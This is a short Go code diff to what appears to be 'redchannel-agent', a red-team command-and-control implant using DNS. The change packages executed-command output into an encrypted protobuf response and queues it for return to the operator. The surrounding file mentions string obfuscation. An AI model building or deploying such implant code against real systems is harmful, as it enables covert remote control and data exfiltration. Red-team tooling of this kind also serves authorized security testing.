@@ -20,6 +20,7 @@ import (
 
 	"github.com/miekg/dns"
 	"github.com/slackr/redchannel-agent/config"
+	"google.golang.org/protobuf/proto"
 )
 
 /** String obfuscation from https://github.com/unixpickle/gobfuscate
@@ -131,11 +132,27 @@ func (a *Agent) SendEncrypted(message []byte, command AgentCommand) {
 		return
 	}
 
-	ciphertext, err := a.crypto.EncryptAesCbc(message, a.crypto.secret)
+	var data []byte
+	if command == AgentCommand_AGENT_KEYX {
+		data = message
+	} else {
+		commandResponse := &Command_Response{}
+		commandResponse.Output = message
+		commandResponse.Status = AgentCommandStatus_STATUS_SUCCESS
+		commandResponseProto, marshalError := proto.Marshal(commandResponse)
+		if marshalError != nil {
+			log.Printf("failed marshal command response: %x (err: %q)\n", commandResponse, marshalError)
+			return
+		}
+		data = commandResponseProto
+	}
+
+	ciphertext, err := a.crypto.EncryptAesCbc(data, a.crypto.secret)
 	if err != nil {
 		log.Printf("error encrypting message: %q (err: %q)\n", message, err)
 		return
 	}
+
 	a.QueueData(command, ciphertext)
 }
 
